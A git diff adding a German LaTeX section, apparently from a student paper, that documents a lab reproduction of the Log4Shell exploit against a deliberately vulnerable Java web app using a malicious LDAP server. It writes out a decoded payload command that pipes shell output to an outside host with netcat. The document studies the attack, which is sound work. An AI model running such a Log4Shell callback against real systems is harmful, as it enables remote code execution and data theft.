@@ -1,3 +1,27 @@
 %! Author = chaorn
 %! Date = 07.01.23
 
+\subsubsection{Versuchsaufbau und Exploit}
+Da die Log4j Bibliothek bereits gepatcht ist und auch sämtliche Java Versionen bereits gepatcht wurden,
+wurde im Versuchsaufbau ein Git Repository verwendet.\footcite{log4jvulnerableapp} Es beinhaltet eine Java Spring Boot Web Applikation, die noch mit
+einer Java Version läuft, die noch anfällig für Log4shell Angriffe ist.\\
+Desweiteren benötigt man einen \gls{ldap}-Server, den man selbst kontrolliert, um einen \gls{jndi}-Lookup zu provozieren. Hierfür verwendet wurde ein weiteres
+Git Repository in dem ein bereits voll konfigurierter Server zur Verfügung gestellt wird. Das Repository wurde jedoch aus GitHub entfernt. Das Kompilat des Schädlichen
+\gls{ldap}-Servers kann nichtsdestotrotz in einem Archiv gefunden werden.\footcite{maliciousLdap}\\
+Der letzte Schritt zum erfolgreichen Ausführen des Exploits ist eine HTTP-Anfrage an das Zielsystem zu senden. In der Anfrage muss nun nurnoch die IP-Addrese mit Port angegeben werden
+unter denen der \gls{ldap}-Server erreichbar ist.
+\input{listings/final-exploit-req}
+\vspace{0.3cm}
+
+Bei der Durchführung des Exploits wurde die Base64 Funktionalität des bereits laufenden \gls{ldap}-Servers verwendet. Daher liegt das auszuführende Skript als base64-encoded String vor. Die Befehle,
+die hier der Reihe nach ausgeführt werden sind übersetzt: \textit{bin/bash | whoami | nc 192.168.186.216 9999}\\
+Die tatsächliche Funktionalität des Skripts konnte jedoch hierbei nicht Revers Engineert werden. Ein eigener Ansatz einer solchen Base64 Funktionalität wäre der Folgende:\\
+\input{listings/Log4j-malware}
+
+%\begin{figure}[!htb]
+%    \begin{center}
+%        \includegraphics[scale=0.3]{images/ExploitAufbau}
+%    \end{center}
+%    \caption{Exploit Aufbau}
+%\end{figure}
+
